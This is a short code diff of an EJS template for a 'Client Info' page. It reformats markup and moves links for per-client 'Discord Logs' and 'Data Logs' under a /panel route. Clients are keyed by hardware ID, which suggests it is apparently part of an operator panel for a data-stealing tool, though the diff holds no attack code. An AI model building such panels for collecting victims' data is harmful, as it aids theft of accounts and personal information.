@@ -7,8 +7,8 @@
             <div class="d-flex align-items-center justify-content-center h-100">
                 <div class="d-flex flex-column" style="width: 50%">
                     <h1 class="text align-self-center"><a style="font-size: 36px" href="#" onclick="window.history.back()">«</a> Client Info</h1>
-                    <p class="text align-self-center" style="padding-bottom:25px;color:rgb(180, 180, 180);">Client info for <%= hwid %>.</p>
-                
+                    <p class="text align-self-center" style="padding-bottom: 25px; color: rgb(180, 180, 180)">Client info for <%= hwid %>.</p>
+
                     <div class="d-flex justify-content-center bd-highlight mb-3">
                         <div class="p-2"><button type="button" class="btn btn-secondary" id="discordLogs">Discord Logs</button></div>
                         <div class="p-2"><button type="button" class="btn btn-secondary" id="dataLogs">Data Logs</button></div>
@@ -20,15 +20,15 @@
         <%- include("includes/scripts.ejs") %>
 
         <script type="text/javascript">
-            $(document).ready(function() {
-                $('#discordLogs').on('click', function() {
-                    window.location.href = '/clients/<%= hwid %>/discord';
+            $(document).ready(function () {
+                $('#discordLogs').on('click', function () {
+                    window.location.href = '/panel/clients/<%= hwid %>/discord';
                 });
 
-                $('#dataLogs').on('click', function() {
-                    window.location.href = '/clients/<%= hwid %>/data';
+                $('#dataLogs').on('click', function () {
+                    window.location.href = '/panel/clients/<%= hwid %>/data';
                 });
             });
-      </script>
+        </script>
     </body>
 </html>
